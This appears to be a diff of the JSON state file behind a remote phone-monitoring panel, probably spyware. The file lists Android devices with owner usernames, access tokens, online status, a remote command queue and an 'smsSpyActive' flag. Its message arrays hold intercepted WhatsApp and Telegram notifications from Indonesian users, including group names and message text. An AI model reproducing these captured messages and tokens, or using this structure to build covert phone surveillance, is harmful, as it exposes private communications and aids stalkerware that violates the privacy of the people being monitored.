@@ -5571,6 +5571,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3115 pesan dari 17 chat",
+        "time": "21/04 18:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776769342018
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (932 pesan): ~ ELSTORE",
         "content": "pencet stikernya",
         "time": "21/04 18:02",
@@ -9560,14 +9568,6 @@
         "time": "21/04 17:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1776767393518
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (866 pesan): Menyebut semua",
-        "content": "~ zunz: @⁨semua⁩ STOK GW SISA YANG 50+ AMBIL GIH BIAR LUDESSSS",
-        "time": "21/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767393436
       }
     ],
     "galleryPhotos": [],
@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776769339158,
+    "lastSeen": 1776769354725,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776769341552,
+    "lastSeen": 1776769356560,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 18:02",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769357417
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -13634,14 +13642,6 @@
         "time": "21/04 17:40",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776768030364
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 17:40",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776768030300
       }
     ],
     "galleryPhotos": [],
@@ -13660,16 +13660,8 @@
     "deviceName": "HP-BBBB-732D",
     "ownerUsername": "pian",
     "token": "06c7d23d86c7cc434c3d79ed0920fb91",
-    "lastSeen": 1776769340360,
-    "commandQueue": [
-      {
-        "type": "flashlight",
-        "payload": {
-          "state": "on"
-        },
-        "sentAt": 1776769273392
-      }
-    ],
+    "lastSeen": 1776769355369,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:59:07.158Z",
     "deviceInfo": {
